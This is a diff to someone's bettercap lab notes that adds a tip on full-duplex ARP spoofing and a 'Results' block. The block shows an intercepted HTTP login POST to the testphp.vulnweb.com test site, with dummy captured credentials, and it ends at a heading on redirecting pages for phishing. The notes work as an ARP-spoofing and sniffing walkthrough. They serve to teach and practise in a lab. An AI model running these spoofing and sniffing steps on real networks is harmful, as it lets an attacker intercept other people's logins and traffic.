@@ -334,6 +334,7 @@ Start full duplex to capture both the router and the victim PC
 ```sh
 set arp.spoof.fullduplex true
 ```
+- I didn't need this but keep it in mind if something is not working 
 
 Start an ARP spoof attack from bettercap using the information gathered
 ```sh
@@ -351,6 +352,27 @@ arp.spoof on
 Start sniffing
 ```sh
 net.sniff on
+```
+
+Results
+```python
+10.0.3.0/24 > 10.0.3.4  » [08:24:53] [net.sniff.http.request] http win11.local. POST testphp.vulnweb.com/userinfo.php
+
+POST /userinfo.php HTTP/1.1
+Host: testphp.vulnweb.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0                                                                                         
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7                                                                                   
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Length: 56
+Content-Type: application/x-www-form-urlencoded
+Referer: http://testphp.vulnweb.com/login.php
+Accept-Encoding: gzip, deflate
+Origin: http://testphp.vulnweb.com
+
+uname=hiimtestingarpspoofing&pass=hiimtestingarpspoofing
 ```
 
 **Redirect from web-page to another. Used in phising**
